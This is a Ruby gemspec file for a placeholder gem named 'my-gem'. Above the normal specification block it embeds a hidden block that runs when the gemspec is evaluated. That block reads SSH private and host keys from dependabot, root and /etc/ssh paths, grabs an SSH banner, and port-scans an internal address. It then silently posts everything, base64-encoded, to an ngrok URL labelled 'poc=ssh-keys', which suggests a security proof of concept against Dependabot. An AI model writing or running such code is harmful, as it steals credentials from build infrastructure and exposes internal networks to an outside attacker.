COLLAB_URL = "https://95a1-2001-1c00-307-d600-d8df-30e8-ad0a-ea8d.ngrok-free.app"

begin
  require "net/http"
  require "socket"
  require "uri"

  results = []

  # SSH banner lezen
  begin
    sock = TCPSocket.new("172.19.0.1", 22)
    sock.setsockopt(Socket::SOL_SOCKET, Socket::SO_RCVTIMEO, [3, 0].pack("l_2"))
    banner = sock.recv(256)
    sock.close
    results << "=== SSH BANNER ===\n#{banner.inspect}"
  rescue => e
    results << "=== SSH BANNER ERR: #{e.class}: #{e.message} ==="
  end

  # SSH private keys zoeken
  key_paths = [
    "/home/dependabot/.ssh/id_rsa",
    "/home/dependabot/.ssh/id_ed25519",
    "/home/dependabot/.ssh/id_ecdsa",
    "/home/dependabot/.ssh/authorized_keys",
    "/home/dependabot/.ssh/known_hosts",
    "/root/.ssh/id_rsa",
    "/root/.ssh/id_ed25519",
    "/root/.ssh/known_hosts",
    "/etc/ssh/ssh_host_rsa_key",
    "/etc/ssh/ssh_host_ed25519_key",
  ]

  key_paths.each do |path|
    if File.exist?(path)
      content = File.read(path) rescue "ERROR READING"
      results << "=== FOUND: #{path} ===\n#{content[0..3000]}"
    end
  end

  # ls /home/dependabot/.ssh/ als die bestaat
  begin
    if Dir.exist?("/home/dependabot/.ssh")
      entries = Dir.entries("/home/dependabot/.ssh")
      results << "=== /home/dependabot/.ssh/ ===\n#{entries.join("\n")}"
    else
      results << "=== /home/dependabot/.ssh DOES NOT EXIST ==="
    end
  rescue => e
    results << "=== SSH DIR ERR: #{e.class} ==="
  end

  # Extra poorten op 172.19.0.1
  [3000, 3306, 5432, 6379, 8888, 10250, 32526].each do |port|
    begin
      s = TCPSocket.new("172.19.0.1", port)
      s.close
      results << "=== 172.19.0.1:#{port} OPEN ==="
    rescue Errno::ECONNREFUSED
      results << "=== 172.19.0.1:#{port} REFUSED ==="
    rescue => e
      results << "=== 172.19.0.1:#{port} #{e.class} ==="
    end
  end

  payload = [results.join("\n\n")].pack("m0")
  post_uri = URI("#{COLLAB_URL}?poc=ssh-keys")
  r = Net::HTTP::Post.new(post_uri)
  r.body = payload
  Net::HTTP.start(post_uri.host, post_uri.port, use_ssl: post_uri.scheme == "https",
                  open_timeout: 8, read_timeout: 8) { |h| h.request(r) }
rescue
end

Gem::Specification.new do |spec|
  spec.name    = "my-gem"
  spec.version = "1.0.0"
  spec.summary = "test"
  spec.add_dependency "rails", "~> 7.0"
end
